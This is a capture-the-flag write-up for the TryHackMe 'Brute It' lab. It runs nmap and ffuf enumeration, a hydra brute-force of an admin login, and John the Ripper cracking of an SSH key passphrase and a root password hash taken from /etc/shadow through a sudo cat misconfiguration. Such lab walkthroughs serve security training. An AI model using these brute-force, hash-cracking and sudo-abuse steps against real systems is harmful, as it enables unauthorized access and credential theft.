## Brute It
https://tryhackme.com/room/bruteit

## Enum

```
nmap -Pn -sC -sV -sS 10.10.57.34 -vv

Scanning 10.10.57.34 [1000 ports]
Discovered open port 80/tcp on 10.10.57.34
Discovered open port 22/tcp on 10.10.57.34
Completed SYN Stealth Scan at 16:36, 4.46s elapsed (1000 total ports)

Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)

nmap -Pn -sS 10.10.57.34 -p- --min-rate=1000

Nmap scan report for 10.10.57.34

Host is up (0.44s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r
________________________________________________

.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 440ms]
.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 3877ms]
.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 4870ms]
admin                   [Status: 200, Size: 671, Words: 159, Lines: 29, Duration: 428ms]
```

![image](https://user-images.githubusercontent.com/6504854/192093142-f408c8f3-82e7-478a-bce4-64de73b7dfee.png)

![image](https://user-images.githubusercontent.com/6504854/192093182-cde4edc7-0625-4280-9567-b6c6cba62b4b.png)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.57.34 http-post-form "/admin/:user=admin&pass=^PASS^:Username or password invalid" -v -t 10
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking http-post-form://10.10.57.34:80/admin/:user=admin&pass=^PASS^:Username or password invalid
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 312.00 tries/min, 312 tries in 00:01h, 14344087 to do in 766:15h, 10 active
[VERBOSE] Page redirected to http://10.10.57.34/admin/panel
[VERBOSE] Page redirected to http://10.10.57.34/admin/panel/
[80][http-post-form] host: 10.10.57.34   login: admin   password: x*****
[STATUS] attack finished for 10.10.57.34 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```
![image](https://user-images.githubusercontent.com/6504854/192093300-395d9007-2ec2-420f-8768-1cf9981cc224.png)

![image](https://user-images.githubusercontent.com/6504854/192093322-871c66fd-20ef-4fb6-a859-637593927fdc.png)

Copy+Paste to id_rsa

```
ssh2john id_rsa > id_rsa.hash

john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
r*********       (id_rsa)
Session completed.
```

```
chmod 600 id_rsa

ssh -i id_rsa john@ip.thm
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

john@bruteit:~$
```

## Flag
```
john@bruteit:~$ cat user.txt
THM{a*************************}

john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

john@bruteit:~$ FILE=/root/root.txt
john@bruteit:~$ sudo cat "$FILE"

THM{p*******************}

john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jU**************************************************************************************L.:18490:0:99999:7:::
john@bruteit:~$
```

```
echo 'root:$6$zdk0.jU**************************************************************************************L.' > root_hash

john root_hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
f*******         (root)
Session completed.
```

Thank you for your time, Happy Hacking 😄

